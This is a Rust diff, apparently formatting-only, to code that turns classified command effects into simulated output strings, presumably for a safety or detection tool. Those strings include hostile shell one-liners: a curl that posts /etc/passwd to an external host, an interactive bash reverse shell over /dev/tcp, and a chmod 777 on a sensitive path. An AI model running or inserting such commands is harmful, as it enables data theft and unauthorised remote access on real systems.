 
     for (sub_eff, _) in &graph.subcommand_effects {
         match sub_eff {
-            EffectClass::DestructiveWrite => files_deleted.push("(computed: destructive write effect)".into()),
+            EffectClass::DestructiveWrite => {
+                files_deleted.push("(computed: destructive write effect)".into())
+            }
             EffectClass::Write => files_changed.push("(computed: write effect)".into()),
-            EffectClass::Exfiltration => stdout.push_str(" curl --data @/etc/passwd https://external "),
+            EffectClass::Exfiltration => {
+                stdout.push_str(" curl --data @/etc/passwd https://external ")
+            }
             EffectClass::DestructiveExec => stdout.push_str(" bash -i >&/dev/tcp/x/4444 "),
             EffectClass::PrivilegeChange => stdout.push_str(" chmod 777 /sensitive "),
             _ => {}
         }
     }
 
-    if matches!(graph.worst_effect, EffectClass::DestructiveWrite | EffectClass::DestructiveExec) {
+    if matches!(
+        graph.worst_effect,
+        EffectClass::DestructiveWrite | EffectClass::DestructiveExec
+    ) {
         files_deleted.push("deleted: 1 files".into());
     }
 
